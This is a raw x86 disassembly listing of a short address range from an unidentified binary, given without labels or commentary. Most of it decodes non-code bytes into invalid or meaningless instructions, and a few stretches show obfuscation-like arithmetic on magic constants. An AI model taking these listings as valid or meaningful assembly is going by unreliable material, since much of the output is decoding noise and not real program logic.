  415fdf:	fld    DWORD PTR [esp+eax*2]
  415fe2:	jle    0x415fd8
  415fe4:	sti    
  415fe5:	adc    edx,esi
  415fe7:	or     ch,BYTE PTR [esi-0x7d]
  415fea:	ss mov al,0xc0
  415fed:	adc    ebp,ebx
  415fef:	add    eax,0xcaef386e
  415ff4:	mov    cl,0xfa
  415ff6:	arpl   bp,dx
  415ff8:	cs test cl,ah
  415ffb:	sub    eax,0xe20a191d
  416000:	adc    DWORD PTR [edx+esi*4],edx
  416003:	pcmpgtb mm3,QWORD PTR [ecx-0x39f9fbf]
  41600a:	jg     0x41601f
  41600c:	aad    0x83
  41600e:	jo     0x415fe2
  416010:	sti    
  416011:	adc    al,BYTE PTR [ebx+0x11]
  416014:	repnz mov ebx,edx
  416017:	dec    eax
  416018:	inc    ebp
  416019:	ret    
  41601a:	arpl   WORD PTR [esi+edx*2+0x4f498b60],di
  416021:	int    0xc0
  416023:	nop
  416024:	cwde   
  416025:	shl    BYTE PTR [eax-0x2b],cl
  416028:	lea    ebx,[ebp+0x6f]
  41602b:	call   0x181d098f
  416030:	das    
  416031:	or     al,0x16
  416033:	sbb    eax,DWORD PTR [ebp-0x73]
  416036:	out    dx,al
  416037:	shl    BYTE PTR [ecx],0xc5
  41603a:	(bad)  
  41603b:	dec    ebx
  41603c:	cmp    bh,bh
  41603e:	xor    DWORD PTR [esi+0x41],eax
  416041:	mov    ah,0x74
  416043:	mov    bl,0x48
  416045:	nop
  416046:	push   cs
  416047:	aad    0xb2
  416049:	jae    0x416090
  41604b:	xor    eax,0x5b
  41604e:	mov    ds:0xebac2d0a,eax
  416053:	push   ds
  416054:	add    eax,0xc01bcabb
  416059:	xchg   esp,eax
  41605a:	inc    ebx
  41605b:	addr16 retf 0x88cb
  41605f:	xor    bh,al
  416061:	cdq    
  416062:	aas    
  416063:	repz xchg ebp,eax
  416065:	xor    ah,BYTE PTR [edx]
  416067:	jge    0x4160b8
  416069:	mov    ah,0x61
  41606b:	mov    esp,0x800831a8
  416070:	retf   0x1c67
  416073:	les    esi,FWORD PTR [ebx+0x1fbad77e]
  416079:	fucomi st,st(5)
  41607b:	or     bh,al
  41607d:	xchg   esi,eax
  41607e:	jnp    0x4160bc
  416080:	inc    esi
  416081:	add    eax,0xf89ca1a0
  416086:	xor    DWORD PTR [ecx+0x9],0x17aa624c
  41608d:	in     eax,dx
  41608e:	retf   0xfa5d
  416091:	call   0xed07c874
  416096:	mov    dh,0x16
  416098:	(bad)  
  416099:	les    edx,FWORD PTR [eax]
  41609b:	jae    0x4160bf
  41609d:	or     edx,DWORD PTR [ecx]
  41609f:	adc    al,0x8f
  4160a1:	in     eax,0x4e
  4160a3:	leave  
  4160a4:	loopne 0x41608e
  4160a6:	adc    bh,BYTE PTR ds:0x40b1561c
  4160ac:	xlat   BYTE PTR ds:[ebx]
  4160ad:	pop    edi
  4160ae:	dec    edi
  4160af:	push   esi
  4160b0:	adc    eax,0x85bcffcd
  4160b5:	popa   
  4160b6:	jle    0x416130
  4160b8:	mov    WORD PTR [ebp+0x4f2bdb75],ss
  4160be:	or     eax,0x45d54f12
  4160c3:	mov    eax,ds:0xfc4f4f79
  4160c8:	dec    edx
  4160c9:	jp     0x4160ba
  4160cb:	in     eax,dx
  4160cc:	inc    ebx
  4160cd:	push   ebx
  4160ce:	mov    bl,bl
  4160d0:	imul   sp,di,0x9c94
  4160d5:	stc    
  4160d6:	jb     0x416140
  4160d8:	push   edx
  4160d9:	dec    edx
  4160da:	into   
  4160db:	and    DWORD PTR [edx+0x28],esp
  4160de:	lods   al,BYTE PTR ds:[esi]
  4160df:	pop    edi
  4160e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e1:	pop    edx
  4160e2:	(bad)  
  4160e3:	int3   
  4160e4:	ret    0xa3d8
  4160e7:	stos   BYTE PTR es:[edi],al
  4160e8:	js     0x416074
  4160ea:	cli    
  4160eb:	ins    BYTE PTR es:[edi],dx
  4160ec:	inc    edi
  4160ed:	stc    
  4160ee:	mov    DWORD PTR [edx+edi*4],edx
  4160f1:	xchg   edi,eax
  4160f2:	or     esp,edi
  4160f4:	rcl    BYTE PTR [ebp-0x373b4a5c],0xe5
  4160fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160fd:	push   ecx
  4160fe:	mov    al,ds:0x851bc7f9
  416103:	repnz hlt 
  416105:	(bad)  
  416106:	sti    
  416107:	mov    DWORD PTR [ebp-0x49124e57],edi
  41610d:	out    dx,al
  41610e:	mov    cl,0xf7
  416110:	pop    ecx
  416111:	lahf   
  416112:	mov    ah,0xa0
  416114:	das    
  416115:	mov    esp,eax
  416117:	adc    al,BYTE PTR [eax-0x7495593d]
  41611d:	lds    ebp,FWORD PTR [ebp+eiz*8+0x49]
  416121:	xor    eax,0x8901921b
  416126:	mov    eax,ds:0xd04b3c5f
  41612b:	xor    eax,0x4f4e7d8e
  416130:	repz push esi
  416132:	pop    edi
  416133:	dec    esi
  416134:	push   edi
  416135:	(bad)
  41613a:	adc    DWORD PTR [ebx],ebp
  41613c:	lods   eax,DWORD PTR ds:[esi]
  41613d:	push   eax
  41613e:	jnp    0x41617c
  416140:	pusha  
  416141:	scas   eax,DWORD PTR es:[edi]
  416142:	rcl    edi,0x80
  416145:	mov    eax,edi
  416147:	mov    esp,eax
  416149:	ja     0x4161a8
  41614b:	lea    ebx,[ebp-0x45]
  41614e:	dec    esp
  41614f:	rol    edx,cl
  416151:	mov    esp,0xa9ce5339
  416156:	addr16 (bad) 
  416158:	or     edi,eax
  41615a:	ja     0x4160f5
  41615c:	jg     0x416191
  41615e:	hlt    
  41615f:	lds    edx,FWORD PTR [ebx+0x28c9dd73]
  416165:	adc    eax,edx
  416167:	imul   ebp,DWORD PTR [esi+0x139796f1],0xc2a802fb
  416171:	std    
  416172:	push   edi
  416173:	mov    eax,ds:0xe8a2cf9c
  416178:	xchg   ebx,eax
  416179:	inc    eax
  41617a:	pop    eax
  41617b:	stos   DWORD PTR es:[edi],eax
  41617c:	ja     0x416199
  41617e:	xchg   esp,eax
  41617f:	addr16 jns 0x41614e
  416182:	pop    es
  416183:	cdq    
  416184:	sti    
  416185:	push   esp
  416186:	pop    ebp
  416187:	sbb    ebp,0x46
  41618a:	add    edx,0xceb3de23
  416190:	mov    bl,0x55
  416192:	xchg   ebp,eax
  416193:	inc    eax
  416194:	adc    esp,DWORD PTR [eax-0x6969240c]
  41619a:	or     al,0xb5
  41619c:	outs   dx,DWORD PTR ds:[esi]
  41619d:	rcl    BYTE PTR [ecx+0x5792ef53],0x15
  4161a4:	jge    0x41615c
  4161a6:	add    BYTE PTR [ebx-0x5fe0802f],0x3e
  4161ad:	sbb    ecx,DWORD PTR [ebx-0x50]
  4161b0:	pop    eax
  4161b1:	pushf  
  4161b2:	test   al,0x56
  4161b4:	pop    esi
  4161b5:	inc    ecx
  4161b6:	push   0xbd938130
  4161bb:	in     al,dx
  4161bc:	sub    eax,0xdd0d571d
  4161c1:	sti    
  4161c2:	pop    ebp
  4161c3:	loopne 0x41616a
  4161c5:	or     al,0x88
  4161c7:	test   eax,0xa2318c4b
  4161cc:	dec    esp
  4161cd:	pop    ebx
  4161ce:	cmp    al,0x4f
  4161d0:	push   cs
  4161d1:	call   0xa819f9f2
  4161d6:	nop
  4161d7:	ins    DWORD PTR es:[edi],dx
  4161d8:	cmp    ebp,esi
  4161da:	push   edx
  4161db:	jge    0x4161ce
  4161dd:	sub    al,BYTE PTR ds:0xfa90cc2f
  4161e3:	das    
  4161e4:	pop    esp
  4161e5:	pop    es
  4161e6:	jb     0x4161cc
  4161e8:	call   0xeb1c:0xd154f612
  4161ef:	jbe    0x41623a
  4161f1:	pop    ss
  4161f2:	ret    0xf5d9
  4161f5:	dec    esi
  4161f6:	xor    dl,BYTE PTR [edi+ebp*8-0x3f]
  4161fa:	adc    eax,0x23560090
  4161ff:	outs   dx,BYTE PTR ds:[esi]
  416200:	rcl    BYTE PTR [ebx-0x383dfea1],0x1f
  416207:	xchg   DWORD PTR [eax],esi
  416209:	push   ss
  41620a:	(bad)  
  41620b:	(bad)  
  41620c:	pop    eax
  41620d:	sub    al,0x71
  41620f:	test   DWORD PTR [ebx],edi
  416211:	mov    ah,0xbc
  416213:	outs   dx,BYTE PTR ds:[esi]
  416214:	neg    ecx
  416216:	push   ecx
  416217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416218:	ins    BYTE PTR es:[edi],dx
  416219:	out    0xd,eax
  41621b:	call   0x544a344
  416220:	repnz or ah,BYTE PTR [ebp+0x481d1764]
  416227:	sar    cl,0x35
  41622a:	imul   ecx,esp,0x35f2ff9d
  416230:	mov    ecx,eax
  416232:	or     edi,DWORD PTR [eax]
  416234:	pop    edi
  416235:	inc    ebp
  416236:	or     DWORD PTR [ebx-0x48],ebp
  416239:	sbb    cl,BYTE PTR [eax]
  41623b:	ret    
  41623c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41623d:	nop
  41623e:	push   ds
  41623f:	cmp    cl,0xca
  416242:	fdiv   st(5),st
  416244:	test   eax,0xffe3849d
  416249:	jge    0x416245
  41624b:	adc    bl,BYTE PTR [edi]
  41624d:	retf   
  41624e:	jbe    0x416237
  416250:	inc    esp
  416251:	jae    0x416208
  416253:	or     eax,0xd532cada
  416258:	in     eax,0x78
  41625a:	fist   DWORD PTR [ecx+0x617b6d9f]
  416260:	and    ebx,ebx
  416262:	push   0x21
  416264:	fwait
  416265:	pop    ecx
  416266:	jne    0x416220
  416268:	fldcw  WORD PTR [ebx+0x3cf361b6]
  41626e:	hlt    
  41626f:	mov    esp,0xb4f84859
  416274:	retf   0xa2e2
  416277:	push   0xffffff82
  416279:	mov    WORD PTR [ecx],ds
  41627b:	loopne 0x4162c1
  41627d:	sub    eax,0x4ecf920d
  416282:	mov    BYTE PTR [eax+edx*2],0xe0
  416286:	icebp  
  416287:	inc    edx
  416288:	pop    eax
  416289:	inc    edx
  41628a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41628b:	xor    al,0xf0
  41628d:	inc    ecx
  41628e:	adc    ch,BYTE PTR [ebx+0x65]
  416291:	push   ecx
  416292:	pop    eax
  416293:	xor    ebp,eax
  416295:	pop    esp
  416296:	icebp  
  416297:	xchg   esp,eax
  416298:	mov    ah,0xce
  41629a:	shl    DWORD PTR [edi-0x78],1
  41629d:	xchg   esi,eax
  41629e:	push   edi
  41629f:	sbb    al,0x18
  4162a2:	or     bh,BYTE PTR [ebp-0x6030c477]
  4162a8:	mov    bh,0x94
  4162aa:	push   esi
  4162ab:	loope  0x4162c4
  4162ad:	(bad)  
  4162ae:	pop    ebp
  4162af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162b0:	pop    ds
  4162b1:	in     al,dx
  4162b2:	mov    esi,0x99834850
  4162b7:	stos   BYTE PTR es:[edi],al
  4162b8:	leave  
  4162b9:	add    BYTE PTR [ecx],0x4a
  4162bc:	mov    dl,0xe8
  4162be:	jecxz  0x41628d
  4162c0:	adc    ebp,DWORD PTR [edi]
  4162c2:	mov    esp,0x18f8a75a
  4162c7:	into   
  4162c8:	mov    ?,WORD PTR [ebp-0x63]
  4162cb:	pushf  
  4162cc:	(bad)  
  4162cd:	xchg   ecx,eax
  4162ce:	mov    cl,0x6b
  4162d0:	cmp    cl,ah
  4162d2:	pusha  
  4162d3:	ss leave 
  4162d5:	mov    ebp,DWORD PTR [eax-0x4384496c]
  4162db:	stc    
  4162dc:	cmc    
  4162dd:	loopne 0x416350
  4162df:	mov    eax,0x47815686
  4162e4:	retf   
  4162e5:	jnp    0x4162b3
  4162e7:	rcr    BYTE PTR [edi+0x6664608a],cl
  4162ed:	jo     0x416354
  4162ef:	leave  
  4162f0:	addr16 or al,0x8e
  4162f3:	gs test bh,ch
  4162f6:	frstor [edi]
  4162f8:	or     eax,0xeae5aeb
  4162fd:	cmp    DWORD PTR [eax-0x120ca79d],ecx
  416303:	icebp  
  416304:	aaa    
  416305:	(bad)  
  416306:	fwait
  416307:	outs   dx,BYTE PTR ds:[esi]
  416308:	stos   BYTE PTR es:[edi],al
  416309:	push   es
  41630a:	mov    esp,0x34cf3975
  41630f:	retf   
  416310:	(bad)  
  416311:	xor    dh,dl
  416313:	dec    esp
  416314:	fdivr  QWORD PTR [esi+0x18176968]
  41631a:	xchg   edx,eax
  41631b:	fild   QWORD PTR [ebp+ebp*2+0x33f6b2e4]
  416322:	cmp    al,BYTE PTR [edi]
  416324:	pushf  
  416325:	dec    eax
  416326:	mov    al,ds:0x7dd445c7
  41632b:	xor    al,0x0
  41632d:	add    BYTE PTR [ebx+0x558bd445],cl
  416333:	fmul   DWORD PTR [ebx-0x4cd223a3]
  416339:	and    al,0x0
  41633b:	add    BYTE PTR [edi],cl
  41633d:	scas   eax,DWORD PTR es:[edi]
  41633e:	ret    0xef35
  416341:	je     0x416343
  416343:	add    BYTE PTR [ebx],dh
  416345:	shl    bh,cl
  416347:	repz mov edx,DWORD PTR [ebp-0x20]
  41634b:	mov    ebx,DWORD PTR [ebp+0x8]
  41634e:	push   0x20
  416350:	and    eax,edx
  416352:	mov    edx,edi
  416354:	sub    edx,eax
  416356:	sub    edx,0x683
  41635c:	mov    DWORD PTR [ebp-0x2c],edx
  41635f:	mov    eax,DWORD PTR [ebp-0x30]
  416362:	mov    edx,DWORD PTR [ebp-0x34]
  416365:	xor    al,dl
  416367:	mov    edx,DWORD PTR [ebp-0x2c]
  41636a:	xor    al,0x58
  41636c:	and    al,0xd8
  41636e:	add    al,BYTE PTR [ebp+0xc]
  416371:	add    al,0x28
  416373:	jmp    0x41677c
  416378:	mov    ebx,0x41d6c237
  41637d:	cmp    edi,DWORD PTR [ebx-0x6192d245]
  416383:	nop
  416384:	xor    BYTE PTR [edx-0x62],dl
  416387:	nop
  416388:	cmp    al,0xcc
  41638a:	sar    BYTE PTR [esi-0x41413b72],0x4f
  416391:	sub    BYTE PTR [eax-0x3e],cl
  416394:	idiv   BYTE PTR [edi+0x6a962b4e]
  41639a:	cmp    DWORD PTR [ebp+0x5d],edx
  41639d:	mov    esp,0xb6df03c7
  4163a2:	mov    ebp,0x770a5e2b
  4163a7:	(bad)  
  4163a8:	adc    DWORD PTR [esp+edx*2+0x2b],ebx
  4163ac:	inc    esi
  4163ae:	popa   
  4163af:	cmp    ch,BYTE PTR [eax]
  4163b1:	and    DWORD PTR [ecx],0xd7757ab7
  4163b7:	test   al,0x15
  4163b9:	lock inc bx
  4163bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163bd:	pushf  
  4163be:	fs pop ebx
  4163c0:	test   eax,0x36cce0c5
  4163c5:	sbb    BYTE PTR [edi+ecx*1],0x30
  4163c9:	mov    al,0xd2
  4163cb:	test   DWORD PTR [esi+0x74],ecx
  4163ce:	adc    BYTE PTR [eax+0x62a62c2e],bl
  4163d4:	shr    WORD PTR [edi],cl
  4163d7:	fwait
  4163d8:	xchg   ebp,edx
  4163da:	push   edi
  4163db:	into   
  4163dc:	push   ss
  4163dd:	rol    bh,0x3d
  4163e0:	push   ds
  4163e1:	ret    0xda6e
  4163e4:	and    eax,0xdb0f124b
  4163e9:	or     edx,DWORD PTR [eax+esi*1+0x7d074852]
  4163f0:	test   al,0xfd
  4163f2:	daa    
  4163f3:	scas   al,BYTE PTR es:[edi]
  4163f4:	dec    edx
  4163f5:	pop    es
  4163f6:	pushf  
  4163f7:	scas   al,BYTE PTR es:[edi]
  4163f8:	in     eax,dx
  4163f9:	popf   
  4163fa:	adc    esp,esp
  4163fc:	ror    DWORD PTR [edi-0x33],cl
  4163ff:	icebp  
  416400:	fisubr DWORD PTR [ecx-0x4d]
  416403:	mov    dh,0x39
  416405:	push   ebx
  416406:	xchg   BYTE PTR [ecx-0x15],cl
  416409:	popf   
  41640a:	jle    0x416395
  41640c:	test   al,0x94
  41640e:	(bad)  
  41640f:	pop    ebx
  416410:	fdivr  st(2),st
  416412:	sub    DWORD PTR [ebx+0x50f5badf],esi
  416418:	add    eax,0xfa43feab
  41641d:	sbb    bl,bl
  41641f:	and    BYTE PTR [eax+0x27e6bb32],dh
  416425:	nop
  416426:	sub    BYTE PTR [edi-0x3d],0x2c
  41642a:	retf   0xc9ad
  41642d:	jae    0x41643f
  41642f:	test   DWORD PTR [ebx],ecx
  416431:	cld    
  416432:	rcl    DWORD PTR [eax+eax*2],cl
  416435:	cdq    
  416436:	imul   edx,DWORD PTR ds:0x87d0cfbd,0xffffffc6
  41643d:	mov    al,ds:0x1c3c74f8
  416442:	mov    ebp,esi
  416444:	int    0xec
  416446:	xchg   edx,eax
  416447:	cmp    al,0x76
  416449:	das    
  41644a:	push   es
  41644b:	les    eax,FWORD PTR [ecx]
  41644d:	cld    
  41644e:	xchg   esp,eax
  41644f:	adc    edx,eax
  416451:	add    esp,DWORD PTR [ecx+0x707b3e7e]
  416457:	loop   0x41644a
  416459:	cld    
  41645a:	inc    esi
  41645b:	stos   DWORD PTR es:[edi],eax
  41645c:	fwait
  41645d:	test   DWORD PTR [esi+0x1f51f93c],ebx
  416463:	pop    ecx
  416464:	sbb    al,0xb1
  416466:	or     bh,BYTE PTR [ebx+0x59]
  416469:	outs   dx,DWORD PTR ds:[esi]
  41646a:	dec    ebp
  41646b:	out    dx,al
  41646c:	int    0xa9
  41646e:	push   ecx
  41646f:	jecxz  0x4164b5
  416471:	sahf   
  416472:	pop    esp
  416473:	scas   eax,DWORD PTR es:[edi]
  416474:	fidivr WORD PTR [edx-0x12ed2303]
  41647a:	test   eax,0xf6d1f521
  41647f:	mov    dl,0x9e
  416481:	retf   
  416482:	xchg   ecx,eax
  416483:	xchg   esi,eax
  416484:	sbb    DWORD PTR [esi+ecx*4+0x42],esp
  416488:	imul   edi,DWORD PTR [edi-0xfacbab1],0x14ed1d8
  416492:	mov    esi,0x50458545
  416497:	addr16 daa 
  416499:	loope  0x41643b
  41649b:	xchg   esi,eax
  41649c:	pushf  
  41649d:	shr    BYTE PTR [eax],1
  41649f:	sahf   
  4164a0:	mov    DWORD PTR [esi+eax*8-0x257287b0],edx
  4164a7:	movsx  eax,BYTE PTR [ebp+0x55c6d374]
  4164ae:	fcomp  QWORD PTR [esi-0x63525d2f]
  4164b4:	cmp    al,0x40
  4164b7:	out    dx,al
  4164b8:	sahf   
  4164b9:	(bad)  
  4164ba:	push   eax
  4164bb:	sar    DWORD PTR [eax+0x35c16369],cl
  4164c1:	out    dx,al
  4164c2:	pop    edx
  4164c3:	jmp    0x41647f
  4164c5:	or     ebp,0x814e5a8d
  4164cb:	ret    0x3b21
  4164ce:	std    
  4164cf:	pop    ss
  4164d0:	dec    ebp
  4164d1:	test   al,0x8a
  4164d3:	mov    ds:0xc8e2c029,al
  4164d8:	dec    eax
  4164d9:	cmp    DWORD PTR [ecx],eax
  4164db:	and    dh,bh
  4164dd:	and    ebx,DWORD PTR [esi]
  4164df:	mov    ebp,0xb11fdc47
  4164e4:	adc    DWORD PTR [edx],0x905cace9
  4164ea:	test   al,0x47
  4164ec:	xor    cl,dl
  4164ee:	fdivr  st(5),st
  4164f0:	in     eax,0xc6
  4164f2:	ins    DWORD PTR es:[edi],dx
  4164f3:	mov    ebx,edx
  4164f5:	inc    edx
  4164f6:	pop    es
  4164f7:	lods   eax,DWORD PTR ds:[esi]
  4164f8:	dec    ebp
  4164f9:	cwde   
  4164fa:	or     eax,0xfdff166
  4164ff:	mov    ecx,0x40be5dfa
  416504:	or     ah,bh
  416506:	call   0xded9e926
  41650b:	xchg   edx,eax
  41650c:	aad    0xcf
  41650e:	and    al,0x77
  416510:	pop    ss
  416511:	shl    BYTE PTR [edx+ebp*8+0x64f064ba],cl
  416518:	into   
  416519:	into   
  41651a:	leave  
  41651b:	int    0x4d
  41651d:	(bad)  
  41651e:	imul   eax,edi,0x76
  416521:	sub    edx,DWORD PTR [esi+eiz*1]
  416524:	leave  
  416525:	pop    esp
  416526:	mov    ebx,0xa6fe919c
  41652b:	data16 (bad) 
  41652d:	fs sub dl,ah
  416530:	inc    ecx
  416531:	or     al,0x85
  416533:	sahf   
  416534:	mov    dh,0xbb
  416536:	mov    DWORD PTR [eax+0x65e7844],ebp
  41653c:	xor    BYTE PTR [eax],bl
  41653e:	mov    DWORD PTR [ebx+esi*1],0x27d9734f
  416545:	adc    BYTE PTR [eax-0x39],bh
  416548:	leave  
  416549:	fbld   TBYTE PTR [ebp-0x3f]
  41654c:	das    
  41654d:	pop    esi
  41654e:	and    bh,ah
  416550:	sbb    al,bh
  416552:	ret    
  416553:	pop    ecx
  416554:	lock inc eax
  416556:	hlt    
  416557:	mov    WORD PTR [eax],es
  416559:	data16 fs or al,0x76
  41655d:	ficom  WORD PTR [ecx+0x5a4596ee]
  416563:	adc    edx,ebx
  416565:	mov    dh,0x4d
  416567:	xchg   ebx,eax
  416568:	add    BYTE PTR [edi+0x57009d91],ch
  41656e:	stos   BYTE PTR es:[edi],al
  41656f:	add    ah,BYTE PTR [ebp-0x3bcd53ef]
  416575:	xchg   ebx,eax
  416576:	jge    0x416560
  416578:	fdiv   DWORD PTR [edx-0x7b10a577]
  41657e:	dec    esi
  41657f:	ss mov eax,0x54a646d4
  416585:	jg     0x4165c3
  416587:	(bad)  
  416588:	loope  0x416547
  41658a:	inc    ecx
  41658b:	fwait
  41658c:	in     al,0x7
  41658e:	mov    ecx,0x3e49c615
  416593:	and    cl,ah
  416595:	jp     0x416587
  416597:	imul   esp,ecx,0xffffffc3
  41659a:	mov    BYTE PTR [edi],dl
  41659c:	push   esi
  41659d:	test   al,0x47
  41659f:	loope  0x416597
  4165a1:	adc    eax,0x726b05ed
  4165a6:	xor    BYTE PTR ds:0x3cfdf58a,0xb9
  4165ad:	xor    DWORD PTR [edx+0x6],edi
  4165b0:	add    al,0x7
  4165b2:	xor    edx,DWORD PTR cs:[edx]
  4165b5:	outs   dx,BYTE PTR ds:[esi]
  4165b6:	in     eax,dx
  4165b7:	test   DWORD PTR [ecx-0x57],edx
  4165ba:	add    BYTE PTR [ecx-0x3e2c018b],0xa
  4165c1:	xchg   BYTE PTR [ecx+0x78],al
  4165c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165c5:	mov    edx,0x482f97e5
  4165ca:	hlt    
  4165cb:	mov    cl,0x9c
  4165cd:	loope  0x4165e6
  4165cf:	popa   
  4165d0:	out    dx,al
  4165d1:	mov    bh,BYTE PTR ds:0x21b9ed48
  4165d7:	ror    DWORD PTR [edi],1
  4165d9:	push   esp
  4165da:	inc    ebp
  4165db:	push   edx
  4165dc:	dec    esp
  4165dd:	test   eax,0x9578a0ce
  4165e2:	xor    edi,DWORD PTR [edx-0x11c2a8f]
  4165e8:	add    esi,DWORD PTR [esi]
  4165ea:	or     DWORD PTR [ebp-0x72],eax
  4165ed:	scas   eax,DWORD PTR es:[edi]
  4165ee:	xchg   DWORD PTR [ebp-0x33],ecx
  4165f1:	bound  eax,QWORD PTR [ecx-0x57]
  4165f4:	lods   al,BYTE PTR ds:[esi]
  4165f5:	dec    edi
  4165f6:	push   es
  4165f7:	cmc    
  4165f8:	dec    ebp
  4165f9:	into   
  4165fa:	cdq    
  4165fb:	or     BYTE PTR [esp+ebp*8+0x296fef01],bl
  416602:	in     eax,0xa2
  416604:	popf   
  416605:	xchg   ebp,eax
  416606:	sub    al,0xc2
  416608:	div    ch
  41660a:	jb     0x4165e5
  41660c:	inc    edi
  41660d:	xchg   DWORD PTR [edi+0x626e55ac],edi
  416613:	mov    al,0x1d
  416615:	retf   0x6a72
  416618:	cmp    eax,0xfa75173f
  41661d:	cmp    ebx,DWORD PTR [edx]
  41661f:	xchg   ebx,eax
  416620:	sbb    BYTE PTR [edx-0x2b],dh
  416623:	mov    ah,0xc4
  416625:	vorps  xmm4,xmm4,xmm1
  416629:	xor    eax,0x66a6d3e3
  41662e:	add    bh,BYTE PTR [ecx-0x709e097]
  416634:	pop    ecx
  416635:	aas    
  416636:	popa   
  416637:	(bad)  
  416638:	loopne 0x4165d7
  41663a:	fisttp WORD PTR [eax+ebp*1]
  41663d:	out    0x33,al
  41663f:	sub    al,0xac
  416641:	jns    0x416684
  416643:	fcompp 
  416645:	or     al,0x2b
  416648:	fsub   QWORD PTR [eax]
  41664a:	or     eax,0x96426ba4
  41664f:	outs   dx,DWORD PTR ds:[esi]
  416650:	js     0x416601
  416652:	test   BYTE PTR [esi],al
  416654:	xchg   ecx,eax
  416655:	xlat   BYTE PTR ds:[ebx]
  416656:	test   edx,ecx
  416658:	mov    eax,ds:0xa96becc6
  41665d:	arpl   di,si
  41665f:	push   ds
  416660:	jmp    0x8ee3:0xb7c0b0fd
  416667:	mov    ebx,0x3222f6df
  41666c:	in     al,0x8c
  41666e:	or     eax,DWORD PTR ds:0x7f264507
  416674:	fisttp WORD PTR [eax+0x21]
  416677:	cmp    ah,cl
  416679:	xor    DWORD PTR [esi],ebx
  41667b:	ret    0x4a30
  41667e:	out    0x6,al
  416680:	sbb    DWORD PTR [esi+0xf],ebx
  416683:	xchg   esp,eax
  416684:	mov    eax,ds:0xa7e085a2
  416689:	mov    esi,0x51eed010
  41668e:	cmp    esp,eax
  416690:	jb     0x416627
  416692:	scas   eax,DWORD PTR es:[edi]
  416693:	mov    ?,WORD PTR [eax+0x5f]
  416696:	sbb    al,0x95
  416698:	cmp    ah,BYTE PTR [esp-0x5f413a9e]
  41669f:	pop    edi
  4166a0:	out    0x88,eax
  4166a2:	jle    0x41665e
  4166a4:	arpl   ax,bp
  4166a6:	or     al,0xa1
  4166a8:	sub    eax,DWORD PTR [edi-0x31]
  4166ab:	xchg   esp,eax
  4166ac:	fsubr  DWORD PTR [ecx-0x6e]
  4166af:	and    DWORD PTR [ebx-0x51],eax
  4166b2:	out    0xc2,al
  4166b4:	push   esp
  4166b5:	(bad)  
  4166b6:	retf   
  4166b7:	je     0x4166bf
  4166b9:	adc    eax,0xaacbf74d
  4166be:	add    al,0xca
  4166c0:	ror    bh,0xa
  4166c3:	xor    al,cl
  4166c5:	icebp  
  4166c6:	lahf   
  4166c7:	jb     0x416720
  4166c9:	jbe    0x4166bc
  4166cb:	push   0xffffffbd
  4166cd:	mov    bh,0x62
  4166cf:	dec    esp
  4166d0:	pusha  
  4166d1:	xchg   ecx,eax
  4166d2:	stc    
  4166d3:	mov    ecx,0x824f9408
  4166d8:	ror    esp,1
  4166da:	jo     0x4166d9
  4166dc:	cmp    BYTE PTR [esi-0x7d],bh
  4166df:	mov    eax,ds:0x82df34e7
  4166e4:	xchg   ebx,eax
  4166e5:	sub    edi,DWORD PTR [ecx+edx*1]
  4166e8:	aaa    
  4166e9:	stos   DWORD PTR es:[edi],eax
  4166ea:	das    
  4166eb:	pop    ebp
  4166ec:	shl    DWORD PTR [edi-0x1845b194],0x6a
  4166f3:	and    BYTE PTR [eax-0x66417d55],bl
  4166f9:	lods   eax,DWORD PTR ds:[esi]
  4166fa:	sub    al,0x65
  4166fc:	push   ecx
  4166fd:	pop    esp
  4166fe:	popf   
  4166ff:	pop    edx
  416700:	loope  0x416716
  416702:	jmp    0x74c6b2c0
  416707:	xchg   DWORD PTR [ebx+0x14],esp
  41670a:	test   dl,cl
  41670c:	leave  
  41670d:	adc    bh,BYTE PTR [esi+ecx*8]
  416710:	dec    ebx
  416711:	cs (bad) 
  416713:	imul   eax,esp,0x64552c99
  416719:	mov    dl,0xcb
  41671b:	sbb    edx,DWORD PTR [edx+0x4bd456e2]
  416721:	ret    0x1ec2
  416724:	cmp    DWORD PTR [edi],eax
  416726:	fnstsw WORD PTR [esi+0x190f001e]
  41672c:	out    dx,eax
  41672d:	pop    edx
  41672e:	sub    DWORD PTR [ecx-0x7f],0xcbe3b463
  416735:	neg    DWORD PTR [esi]
  416737:	or     eax,DWORD PTR [ecx]
  416739:	xchg   ecx,eax
  41673a:	add    al,0x1e
  41673c:	pushf  
  41673d:	fsub   st(5),st
  41673f:	or     eax,0xd7e2a6de
  416744:	add    BYTE PTR [ebx],dh
  416746:	outs   dx,DWORD PTR ds:[esi]
  416747:	push   dx
  416749:	xchg   ebp,eax
  41674a:	and    BYTE PTR [edx-0x1ceeb36c],ch
  416750:	mov    WORD PTR [ebp+0x4b121f8b],cs
  416756:	bswap  esi
  416758:	lahf   
  416759:	xchg   esi,eax
  41675a:	push   eax
  41675b:	mov    bh,0x8c
  41675d:	fcom   DWORD PTR [esi]
  41675f:	mov    ds:0xe1446b,al
  416764:	lea    ebp,[ecx-0x604efabd]
  41676a:	adc    eax,0xb2d217d4
  41676f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416770:	mov    eax,ds:0xd6700110
  416775:	inc    esi
  416776:	dec    esi
  416777:	in     eax,dx
  416778:	mov    eax,0x880e2638
  41677d:	add    al,0x1a
  41677f:	mov    eax,DWORD PTR [ebp-0x38]
  416782:	add    eax,DWORD PTR [ebp-0x3c]
  416785:	mov    edx,DWORD PTR [ebp-0x40]
  416788:	xor    eax,edx
  41678a:	mov    edx,DWORD PTR [ebp-0x44]
  41678d:	xor    eax,edx
  41678f:	mov    edx,0x61f7
  416794:	sub    edx,eax
  416796:	mov    eax,DWORD PTR [ebp-0x4]
  416799:	add    edi,edx
  41679b:	mov    edx,DWORD PTR [ebp-0x8]
  41679e:	sub    eax,0x7721
  4167a3:	xor    eax,edx
  4167a5:	mov    edx,DWORD PTR [ebp-0xc]
  4167a8:	xor    eax,edx
  4167aa:	or     eax,0x7bc9
  4167af:	xor    eax,0xfffff0db
  4167b4:	mov    DWORD PTR [ebp-0x2c],edi
  4167b7:	sub    edi,eax
  4167b9:	mov    eax,DWORD PTR [ebp-0x10]
